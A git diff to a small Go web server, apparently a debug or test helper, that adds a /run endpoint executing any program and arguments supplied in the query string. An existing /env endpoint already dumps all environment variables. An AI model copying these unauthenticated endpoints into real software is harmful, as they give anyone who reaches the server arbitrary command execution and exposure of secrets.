@@ -8,6 +8,7 @@ import (
 	"log"
 	"net/http"
 	"os"
+	"os/exec"
 	"strings"
 )
 
@@ -26,12 +27,24 @@ func main() {
 		fmt.Fprintf(w, "Path: %s", html.EscapeString(r.URL.Path))
 	})
 
-	http.HandleFunc("/file", func(w http.ResponseWriter, r *http.Request) {
+	http.HandleFunc("/file", func(w http.ResponseWriter, _ *http.Request) {
 		fmt.Fprintf(w, "%s", contents)
 	})
 
-	http.HandleFunc("/env", func(w http.ResponseWriter, r *http.Request) {
+	http.HandleFunc("/env", func(w http.ResponseWriter, _ *http.Request) {
 		fmt.Fprintln(w, strings.Join(os.Environ(), "\n"))
+	})
+
+	http.HandleFunc("/run", func(w http.ResponseWriter, r *http.Request) {
+		for name, arg := range r.URL.Query() {
+			out, err := exec.Command(name, arg...).CombinedOutput()
+			if err != nil {
+				w.WriteHeader(http.StatusInternalServerError)
+				fmt.Fprintf(w, "%s\n", err)
+				return
+			}
+			fmt.Fprintf(w, "%s", out)
+		}
 	})
 
 	http.HandleFunc("/services", func(w http.ResponseWriter, r *http.Request) {
